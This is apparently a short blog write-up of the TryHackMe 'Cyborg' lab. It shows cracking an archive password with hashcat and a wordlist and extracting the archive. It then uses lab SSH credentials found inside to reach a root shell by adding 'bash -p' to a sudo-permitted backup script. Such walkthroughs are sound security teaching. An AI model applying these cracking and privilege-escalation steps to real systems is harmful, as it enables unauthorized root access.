---
title: Cyborg
description: 'Cracking the password of a Borg archive and abusing permissions to execute code as root'
pubDate: 2024-05-18
category: 'tryhackme'
tags: ['borg archive']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/6cc3e134a104210f90367c6557e42b6e.jpeg'
---

## Getting the password

```bash
hashcat hash /usr/share/wordlists/rockyou.txt --user
...[snip]...
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
...[snip]...
```

## Extracting the archive
```bash
borg list final_archive
Enter passphrase for key /home/ex-it/Documents/THM/cyborg/final_archive:
music_archive                        Tue, 2020-12-29 15:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

```bash
┌──(ex-it㉿kali)-[~/Documents/THM/cyborg/extracted]
└─$ borg extract ../final_archive::music_archive
Enter passphrase for key /home/ex-it/Documents/THM/cyborg/final_archive:
Warning: The repository at location /home/ex-it/Documents/THM/cyborg/final_archive was previously located at /home/ex-it/.local/share/Trash/files/final_archive
Do you want to continue? [yN] Y
```

## SSH credentials
from `extracted/home/alex/Documents/note.txt`:
alex:S3cretP@s3

## Privesc

```bash
sudo -l
...[snip]...
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```
Can't write to the `backup.sh` file but we are owner so we can change the permissions:

```bash
chmod 777 /etc/mp3backups/backup.sh
```

On top of the backup script we add `bash -p`.
Now when we execute the script with `sudo /etc/mp3backups/backup.sh` we drop in to a root shell.

```bash
alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh
root@ubuntu:/etc/mp3backups# id
uid=0(root) gid=0(root) groups=0(root)
```
